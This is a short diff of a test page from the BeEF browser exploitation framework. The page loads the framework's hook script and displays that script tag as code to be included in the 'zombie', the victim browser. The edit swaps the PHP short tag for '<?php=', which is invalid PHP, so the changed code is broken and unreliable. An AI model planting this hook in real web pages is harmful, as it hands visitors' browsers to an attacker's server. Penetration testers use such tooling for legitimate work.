@@ -7,12 +7,12 @@
 <body>
 	<img src="../images/beef.gif" alt="BeEF"/>BeEF Test Page<br><br>
 
-	<script language='Javascript' src="http://<?=$_SERVER['SERVER_NAME']?>/beef/hook/beefmagic.js.php"></script>
+	<script language='Javascript' src="http://<?php=$_SERVER['SERVER_NAME']?>/beef/hook/beefmagic.js.php"></script>
 	
 	The following code needs to be included in the zombie:<br>
 	<code>
 	&#x3C;script language='Javascript'
-	src="http://<?=$_SERVER['SERVER_NAME']?>/beef/hook/beefmagic.js.php'&#x3E;&#x3C;/script&#x3E;
+	src="http://<?php=$_SERVER['SERVER_NAME']?>/beef/hook/beefmagic.js.php'&#x3E;&#x3C;/script&#x3E;
     </code>
     <br>
     
